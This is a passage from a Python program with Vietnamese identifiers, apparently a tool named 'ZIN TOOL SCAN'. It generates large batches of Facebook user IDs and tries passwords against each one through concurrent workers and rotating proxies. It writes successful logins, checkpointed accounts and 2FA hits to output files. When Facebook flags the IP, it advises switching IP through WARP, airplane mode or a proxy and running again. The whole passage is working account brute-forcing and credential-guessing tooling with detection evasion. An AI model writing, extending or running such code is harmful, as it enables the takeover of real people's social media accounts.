        print(f"  {C.YELLOW}{C.B}📋 SERIES: {C.WHITE}{ten}{C.R}")
        vach_ngan()
        la_ngau_nhien = (tien_to == "NGẪU NHIÊN")
        if la_ngau_nhien:
            print(f"  {mau_cau_vong('🎲 Ngẫu nhiên mọi series (2005-2012)',
                                  palette=RAINBOW3)}")
        else:
            print(f"  {C.CYAN}Độ dài thân: "
                  f"{C.WHITE}{C.B}{do_dai}{C.R} chữ số")
        vach_ngan()
        print()

        ket_qua = self._chon_scan_mode()
        if ket_qua is None:
            self.chay()
            return
        cfg, workers = ket_qua
        mode = cfg["password_mode"]

        in_logo(hoat_hinh=False)
        print(f"  {C.YELLOW}{C.B}📋 SERIES: {C.WHITE}{ten}{C.R}")
        print(f"  {cfg['color']}{C.B}{cfg['icon']} "
              f"{cfg['name']}{C.R} {C.GRAY}▸ {cfg['desc']}{C.R}")
        print(f"  {C.CYAN}Workers  : {C.WHITE}{C.B}{workers}{C.R} "
              f"{C.GRAY}| Mật khẩu: {C.WHITE}{C.B}"
              f"{dem_mat_khau_mode(mode)}{C.R}")
        vach_ngan()
        print(f"  {C.GRAY}Ví dụ: 1000, 5000, 10000, 200000{C.R}")
        try:
            nhap = input(f"  {C.CYAN}{C.B}➤ Số lượng UID: {C.R}").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)
        try:
            so_luong = int(nhap)
        except (ValueError, TypeError):
            print(f"  {C.RED}✗ Không phải số hợp lệ{C.R}")
            time.sleep(1)
            self.chay_kiem_tra(ten, tien_to, do_dai)
            return
        if so_luong <= 0:
            print(f"  {C.RED}✗ Số lượng phải lớn hơn 0{C.R}")
            time.sleep(1)
            self.chay_kiem_tra(ten, tien_to, do_dai)
            return
        if so_luong > CONFIG["max_limit"]:
            print(f"  {C.RED}✗ Vượt giới hạn "
                  f"({CONFIG['max_limit']}){C.R}")
            time.sleep(1)
            self.chay_kiem_tra(ten, tien_to, do_dai)
            return
        try:
            asyncio.run(self._chay_bat_dong_bo(
                ten, tien_to, do_dai, so_luong, mode, workers, cfg))
        except KeyboardInterrupt:
            print(f"\n  {C.RED}⏹ Dừng bởi người dùng{C.R}")

    async def _chay_bat_dong_bo(self, ten, tien_to, do_dai, so_luong,
                                  mode, workers, cfg):
        global _STOP_EVENT
        _STOP_EVENT = asyncio.Event()
        vong_lap = asyncio.get_running_loop()
        cai_dat_tin_hieu(vong_lap, _STOP_EVENT)

        CONFIG["concurrency"] = workers
        CONFIG["queue_maxsize"] = max(400, workers * 4)

        quan_ly_proxy = QuanLyProxy(CONFIG["proxy_file"])
        thong_ke = ThongKe()
        thong_ke.uid_tong = so_luong

        tieu_de_dong = TieuDeDong()
        tieu_de_dong.bat_dau(thong_ke)

        la_ngau_nhien = (tien_to == "NGẪU NHIÊN")
        nhan_series = "ngaunhien" if la_ngau_nhien else ten

        ghi_file = QuanLyGhiFile(CONFIG["output_dir"],
                                   nhan_series=nhan_series)
        ghi_file.chuan_bi()

        trang_thai = QuanLyTrangThai(CONFIG["state_file"])
        trang_thai.du_lieu["series"] = ten

        bo_sinh = BoSinhUID(
            prefixes=tien_to if not la_ngau_nhien else (),
            do_dai_than=do_dai,
            la_ngau_nhien=la_ngau_nhien,
        )
        so_mk = dem_mat_khau_mode(mode)

        in_logo(hoat_hinh=False)
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} TỔNG UID     "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{so_luong}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} SERIES       "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{ten}{C.R}")
        print(f"  {cfg['color']}{C.B}[ ✓ ]{C.R} MODE         "
              f"{C.GRAY}▸{C.R} {cfg['color']}{C.B}"
              f"{cfg['icon']} {cfg['name']}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} WORKERS      "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{workers}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} MẬT KHẨU/UID "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{so_mk}{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} TIMEOUT      "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}{CONFIG['timeout']}s{C.R}")
        print(f"  {C.GREEN}{C.B}[ ✓ ]{C.R} PROXY        "
              f"{C.GRAY}▸{C.R} {C.WHITE}{C.B}"
              f"{len(quan_ly_proxy.danh_sach) if CONFIG['enable_proxy'] else 'TẮT'}"
              f"{C.R}")
        vach_ngan()
        print(f"  {mau_cau_vong('⚡ ZIN TOOL SCAN - VĨNH HẰNG THIÊN TÔN')}")
        vach_ngan()
        print()

        xoay_tron("Khởi động hệ thống", thoi_gian=0.6)
        cham_cho("Chuẩn bị hàng đợi", thoi_gian=0.4)
        print()

        hang_doi = asyncio.Queue(maxsize=CONFIG["queue_maxsize"])
        san_xuat_xong = asyncio.Event()
        dem_da_sinh = [0]

        async def san_xuat():
            try:
                con_lai = so_luong
                kich_thuoc_lo = CONFIG["uid_generate_chunk"]
                while con_lai > 0 and not _STOP_EVENT.is_set():
                    can = min(kich_thuoc_lo, con_lai)
                    lo = bo_sinh.sinh_lo(can)
                    for uid in lo:
                        if _STOP_EVENT.is_set():
                            break
                        await hang_doi.put(uid)
                        dem_da_sinh[0] += 1
                        con_lai -= 1
                        if con_lai <= 0:
                            break
            finally:
                san_xuat_xong.set()

        async def cong_nhan(bo_kiem_tra):
            while True:
                try:
                    uid = await asyncio.wait_for(
                        hang_doi.get(),
                        timeout=CONFIG["worker_poll_timeout"],
                    )
                except asyncio.TimeoutError:
                    if san_xuat_xong.is_set() and hang_doi.empty():
                        return
                    continue
                except asyncio.CancelledError:
                    return
                try:
                    if not _STOP_EVENT.is_set():
                        await bo_kiem_tra.kiem_tra_tai_khoan(uid)
                except asyncio.CancelledError:
                    raise
                except Exception as e:
                    bo_kiem_tra.thong_ke.loi_uid += 1
                    sys.stderr.write(
                        f"[Công Nhân] uid={uid} "
                        f"{type(e).__name__}: {e}\n")
                finally:
                    hang_doi.task_done()

        async with BoKiemTra(quan_ly_proxy, thong_ke,
                              ghi_file, trang_thai,
                              mode=mode) as bo_kiem_tra:
            danh_sach_cong_nhan = [
                asyncio.create_task(cong_nhan(bo_kiem_tra))
                for _ in range(workers)
            ]
            tac_vu_san_xuat = asyncio.create_task(san_xuat())
            try:
                await tac_vu_san_xuat
                await asyncio.gather(*danh_sach_cong_nhan,
                                      return_exceptions=True)
            except asyncio.CancelledError:
                for cn in danh_sach_cong_nhan:
                    cn.cancel()
                await asyncio.gather(*danh_sach_cong_nhan,
                                      return_exceptions=True)
            except Exception as e:
                sys.stderr.write(f"[Chính] Lỗi sản xuất: {e}\n")
            finally:
                for cn in danh_sach_cong_nhan:
                    if not cn.done():
                        cn.cancel()
                if not tac_vu_san_xuat.done():
                    tac_vu_san_xuat.cancel()
                await asyncio.gather(*danh_sach_cong_nhan,
                                      tac_vu_san_xuat,
                                      return_exceptions=True)

        try:
            await ghi_file.ket_thuc()
        except Exception:
            pass
        try:
            await trang_thai.luu()
        except Exception:
            pass

        tieu_de_dong.dung()
        try:
            with _STDOUT_KHOA:
                sys.stdout.write("\r" + " " * 44 + "\r")
                sys.stdout.write("\033]0;ZIN TOOL SCAN\007")
                sys.stdout.flush()
        except OSError:
            pass

        for cb in bo_sinh.canh_bao_gan_can():
            sys.stderr.write(f"[UID] Cảnh báo gần cạn: {cb}\n")

        self._in_tong_ket(thong_ke, ghi_file, dem_da_sinh[0],
                           cfg, mode, workers)
        try:
            input(f"  {C.CYAN}➤ Nhấn Enter để thoát...{C.R}")
        except (EOFError, KeyboardInterrupt):
            print()

    def _in_tong_ket(self, thong_ke, ghi_file, da_sinh,
                       cfg, mode, workers):
        ty_le_flag = thong_ke.ty_le_cp_nghi_ngo()
        print()
        print("  " + vien_cau_vong("═"))
        print()
        hop_can_giua("✦ HOÀN TẤT ✦")
        print()
        print("  " + vien_cau_vong("═", palette=RAINBOW2))
        print()
        print(f"  {cfg['color']}{C.B}Chế Độ          {C.R}{C.GRAY}▸{C.R} "
              f"{cfg['color']}{C.B}{cfg['icon']} {cfg['name']}{C.R}")
        print(f"  {cfg['color']}{C.B}Workers         {C.R}{C.GRAY}▸{C.R} "
              f"{cfg['color']}{C.B}{workers}{C.R}")
        print(f"  {C.GREEN}{C.B}Thành Công      {C.R}{C.GRAY}▸{C.R} "
              f"{C.GREEN}{C.B}{thong_ke.thanh_cong}{C.R}")
        print(f"  {C.GOLD}{C.B}CP THẬT (đào)   {C.R}{C.GRAY}▸{C.R} "
              f"{C.GOLD}{C.B}{thong_ke.cp_that}{C.R}")
        print(f"  {C.YELLOW}{C.B}CP nghi ngờ     {C.R}{C.GRAY}▸{C.R} "
              f"{C.YELLOW}{C.B}{thong_ke.cp_nghi_ngo}{C.R}")
        print(f"  {C.CRIMSON}{C.B}CP GIẢ          {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}{thong_ke.cp_gia}{C.R}")
        print(f"  {C.CRIMSON}{C.B}UID bị CP       {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}"
              f"{thong_ke.uid_cp_nghi + thong_ke.uid_cp_gia}"
              f"/{thong_ke.uid_da_xu_ly} "
              f"({ty_le_flag*100:.0f}%){C.R}")
        print(f"  {C.PINK}{C.B}Xác Minh 2 Bước {C.R}{C.GRAY}▸{C.R} "
              f"{C.PINK}{C.B}{thong_ke.hai_buoc}{C.R}")
        print(f"  {C.CRIMSON}{C.B}Lỗi Request     {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}{thong_ke.loi_request}{C.R}")
        print(f"  {C.CRIMSON}{C.B}Lỗi Ghi File    {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}{thong_ke.loi_ghi_file}{C.R}")
        print(f"  {C.CRIMSON}{C.B}Lỗi UID (bug)   {C.R}{C.GRAY}▸{C.R} "
              f"{C.CRIMSON}{C.B}{thong_ke.loi_uid}{C.R}")
        print(f"  {C.CYAN}{C.B}UID Đã Xử Lý    {C.R}{C.GRAY}▸{C.R} "
              f"{C.CYAN}{C.B}{thong_ke.uid_da_xu_ly}/"
              f"{thong_ke.uid_tong}{C.R}")
        print(f"  {C.CYAN}{C.B}Password Đã Thử {C.R}{C.GRAY}▸{C.R} "
              f"{C.CYAN}{C.B}{thong_ke.da_thu}{C.R}")
        print(f"  {C.VIOLET}{C.B}Đã Thử Lại      {C.R}{C.GRAY}▸{C.R} "
              f"{C.VIOLET}{C.B}{thong_ke.thu_lai}{C.R}")
        print(f"  {C.VIOLET}{C.B}Thời Gian       {C.R}{C.GRAY}▸{C.R} "
              f"{C.VIOLET}{C.B}{thong_ke.thoi_gian_chay():.1f} giây{C.R}")
        print(f"  {C.SKY}{C.B}Tốc Độ Pass     {C.R}{C.GRAY}▸{C.R} "
              f"{C.SKY}{C.B}{thong_ke.toc_do():.1f}/giây{C.R}")
        print(f"  {C.SKY}{C.B}Tốc Độ UID      {C.R}{C.GRAY}▸{C.R} "
              f"{C.SKY}{C.B}{thong_ke.toc_do_uid():.1f}/giây{C.R}")
        print(f"  {C.WHITE}{C.B}Tổng Đã Sinh    {C.R}{C.GRAY}▸{C.R} "
              f"{C.WHITE}{C.B}{da_sinh}{C.R}")

        if thong_ke._da_abort:
            print()
            print(f"  {C.RED}{C.B}🚨 Session đã bị ABORT do IP bị "
                  f"Facebook flag ({ty_le_flag*100:.0f}% UID CP){C.R}")
            print(f"  {C.YELLOW}→ Đổi IP (WARP/Airplane/Proxy) "
                  f"rồi chạy lại.{C.R}")
        elif ty_le_flag >= CONFIG["flag_canh_bao_ty_le"]:
            print()
            print(f"  {C.YELLOW}{C.B}⚠️  IP có dấu hiệu bị flag "
                  f"({ty_le_flag*100:.0f}% UID CP).{C.R}")
            print(f"  {C.GRAY}→ Nên đổi IP trước khi chạy tiếp.{C.R}")

        print()
        print(f"  {C.GOLD}💾 Thư mục: {C.WHITE}{CONFIG['output_dir']}{C.R}")
        if ghi_file is not None:
            nhan_loai = {
                "thanhcong": "OK (login được)",
                "cp_that": "CP THẬT (đào)",
                "cp_nghi_ngo": "CP nghi ngờ",
                "cp_gia": "CP GIẢ (IP flag)",
                "haibuoc": "2FA",
            }
            for loai in ("thanhcong", "cp_that", "cp_nghi_ngo",
                          "cp_gia", "haibuoc"):
                duong_dan = ghi_file.tep.get(loai, {}).get("txt")
                if duong_dan and duong_dan.exists():
                    print(f"     {C.GRAY}• {nhan_loai[loai]}: "
                          f"{duong_dan.name}{C.R}")
        print()
        print("  " + vien_cau_vong("✦"))
        print()


def main():
    try:
        UngDungZin().chay()
    except KeyboardInterrupt:
        print(f"\n\n  {C.RED}⏹ Đã dừng bởi người dùng{C.R}\n")
        sys.exit(0)
    except Exception as e:
        sys.stderr.write(f"\n  {C.RED}✗ Lỗi: "
                         f"{type(e).__name__}: {e}{C.R}\n")
        sys.exit(1)


if __name__ == "__main__":
    main()